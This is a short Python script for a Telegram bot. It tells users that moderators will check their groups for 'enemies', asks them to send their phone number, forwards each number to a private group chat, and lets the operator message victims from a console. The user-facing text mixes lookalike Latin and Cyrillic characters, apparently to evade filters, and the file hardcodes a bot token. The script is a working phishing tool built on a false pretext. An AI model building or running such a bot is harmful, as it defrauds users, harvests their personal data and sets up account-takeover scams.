import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup

TOKEN = '8189860321:AAGfE152LkvxG-xBmCyQQE7nlrOZ9RvVkjk'  # Замените на ваш токен
GROUP_CHAT_ID = '-1002282070847'  # Замените на ID вашей группы

bot = telebot.TeleBot(TOKEN)

# Словарь для хранения ID пользователей, которые начали взаимодействие с ботом
user_ids = set()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_ids.add(message.from_user.id)  # Добавляем ID пользователя в множество
    print(f'Пользователь {message.from_user.username} с ID {message.from_user.id} добавлен.')  # Отладочное сообщение
    button = KeyboardButton("Otпpaвить нoмep тeлeфoнa", request_contact=True)
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(button)  # Добавляем кнопку в разметку
    bot.send_message(message.chat.id, 'Пpивeт! Этo пpoвepкa твoиx гpyпп/кaнaлoв. He бoйcя, мoдepaтop пpocтo пocмoтpит твoи гpyппы нa нaличиe нaшиx вpaгoв. Чтoбы нaчaть, oтпpaвь, пoжaлyйcтa, cвoй нoмep, чтoбы мoдepaтopы мoгли cвязaтьcя c тoбoй или жe пpoвecти пpoвepкy.', reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    # Отправляем номер телефона в группу
    bot.send_message(GROUP_CHAT_ID, f'новый номерок от @{message.from_user.username}: {contact.phone_number}')
    
    # Убираем клавиатуру, редактируя предыдущее сообщение
    bot.send_message(message.chat.id, 'Cпacибo! Baш нoмep был oтпpaвлeн мoдepaтopaм, oжидaйтe, пoкa вaм нaпишyт.', reply_markup=telebot.types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda message: True, content_types=['text'])  # Обработчик для любых текстовых сообщений
def echo_all(message):
    print(f'Получено сообщение от {message.from_user.username}: {message.text}')  # Выводим сообщение в консоль

def send_message_from_console():
    while True:
        user_id = input("Введите ID пользователя: ")
        message_text = input("Введите сообщение: ")
        try:
            user_id = int(user_id)
            if user_id in user_ids:  # Проверяем, что пользователь взаимодействовал с ботом
                bot.send_message(user_id, message_text)
                print(f'Сообщение отправлено пользователю {user_id}: {message_text}')
            else:
                print(f'Пользователь с ID {user_id} не найден. Доступные ID: {user_ids}')  # Выводим доступные ID
        except ValueError:
            print("Пожалуйста, введите корректный ID пользователя.")

if __name__ == '__main__':
    import threading
    # Запускаем бота в отдельном потоке
    threading.Thread(target=bot.polling).start()
    # Запускаем функцию для отправки сообщений из консоли
    send_message_from_console()